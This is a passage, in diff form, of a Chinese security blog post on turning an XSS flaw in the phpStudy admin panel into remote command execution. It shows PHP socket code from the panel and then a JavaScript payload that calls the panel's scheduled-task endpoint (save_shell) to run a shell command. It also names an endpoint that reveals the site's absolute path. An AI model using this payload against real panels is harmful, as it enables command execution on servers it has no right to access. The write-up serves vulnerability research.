+<span class="line" data-line="24"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> ($buff </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> socket_read</span><span style="color:#E1E4E8">($socket,</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">        $encoding </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> mb_detect_encoding</span><span style="color:#E1E4E8">($buff, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"ASCII"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'UTF-8'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"GB2312"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"GBK"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'BIG5'</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">($encoding</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'EUC-CN'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">            $buff </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> iconv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'GBK'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'UTF-8'</span><span style="color:#E1E4E8">, $buff);</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="30"></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">        $res </span><span style="color:#F97583">.=</span><span style="color:#E1E4E8"> $buff;</span></span>
+<span class="line" data-line="32"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($res,</span><span style="color:#F97583">-</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'^^^'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="33"><span style="color:#79B8FF">            socket_close</span><span style="color:#E1E4E8">($socket);</span></span>
+<span class="line" data-line="34"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="35"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="37"></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> rtrim</span><span style="color:#E1E4E8">($res,</span><span style="color:#9ECBFF">'^^^'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="39"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($res </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'ipdeny'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="40"><span style="color:#B392F0">        xpexit</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">json_encode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">403</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'该IP被禁止访问'</span><span style="color:#E1E4E8">)));</span></span>
+<span class="line" data-line="41"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="42"></span>
+<span class="line" data-line="43"><span style="color:#6A737D">    //检验token</span></span>
+<span class="line" data-line="44"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($_data[</span><span style="color:#9ECBFF">'command'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> 'login'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="45"><span style="color:#E1E4E8">        $res_ </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> json_decode</span><span style="color:#E1E4E8">($res,</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="46"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($res_[</span><span style="color:#9ECBFF">'result'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8">$res_[</span><span style="color:#9ECBFF">'result'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">==-</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="47"><span style="color:#B392F0">            distorySession</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="48"><span style="color:#B392F0">            xpexit</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">json_encode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1001</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'您已经在其他地方登录过了，即将退出当前页面'</span><span style="color:#E1E4E8">)));</span></span>
+<span class="line" data-line="49"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="50"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="51"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="52"></span>
+<span class="line" data-line="53"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> $res;</span></span>
+<span class="line" data-line="54"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><code>Socket</code> 类中我们看到 <code>socket_write()</code> 写入，然后通过 <code>socket_read()</code> 读取结果</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">socket_write</span><span style="color:#E1E4E8">($socket, $data,</span><span style="color:#79B8FF">strlen</span><span style="color:#E1E4E8">($data));</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$res </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">while</span><span style="color:#E1E4E8"> ($buff </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> socket_read</span><span style="color:#E1E4E8">($socket,</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    $encoding </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> mb_detect_encoding</span><span style="color:#E1E4E8">($buff, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"ASCII"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'UTF-8'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"GB2312"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"GBK"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'BIG5'</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($encoding</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'EUC-CN'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">        $buff </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> iconv</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'GBK'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'UTF-8'</span><span style="color:#E1E4E8">, $buff);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">.=</span><span style="color:#E1E4E8"> $buff;</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">($res,</span><span style="color:#F97583">-</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'^^^'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">        socket_close</span><span style="color:#E1E4E8">($socket);</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">        break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">}</span></span></code></pre>
+<h2 id="rce">RCE</h2>
+<p>我们可以通过构造恶意 <code>js</code> 代码来发送新增 <code>计划任务</code> 的请求，从而来实现 RCE</p>
+<p><img src="https://img.5ime.cn/phpstudy_xss2rce/image-20230203224555825.png" alt="image-20230203224555825"></p>
+<p>这里我们直接在网站根目录下创建一个 <code>1.txt</code> 文件，同时写入 <code>test</code> 内容，代码如下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> xhr </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> XMLHttpRequest</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">xhr.</span><span style="color:#B392F0">open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"POST"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"/service/app/tasks.php?type=save_shell"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">xhr.</span><span style="color:#B392F0">setRequestHeader</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"X-Requested-With"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"XMLHttpRequest"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">xhr.</span><span style="color:#B392F0">setRequestHeader</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Content-type"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"application/x-www-form-urlencoded; charset=UTF-8"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">xhr.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"title=test&#x26;exec_cycle=5&#x26;week=1&#x26;day=3&#x26;hour=1&#x26;minute=1&#x26;shell=echo test > D:</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">xp.cn</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">www</span><span style="color:#79B8FF">\w</span><span style="color:#9ECBFF">wwroot</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">admin</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">localhost_80</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">1.txt"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>关于网站的绝对路径，可以通过以下接口获取，请求头必须添加 <code>X-Requested-With</code>，否则接口会返回 <code>404</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>/service/app/sites.php?type=site_list</span></span></code></pre>
+<p><img src="https://img.5ime.cn/phpstudy_xss2rce/image-20230203231047825.png" alt="image-20230203231047825"></p>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/uIeJIUQtica6EYcJ7PYcpQ">phpstudyRCE</a></li>
+</ul>   </section> <footer class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 space-y-2 relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/phpstudy-xss2rce/index.html" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/phpstudy-xss2rce/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>   </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.CxRYfcJe.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2025 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const r=a.getElementsByTagName("img");Array.from(r).forEach((e,n)=>{e.alt||(e.alt=`文章配图 ${n+1}`);const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.setAttribute("aria-label",`查看大图：${e.alt}`),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></body></html>
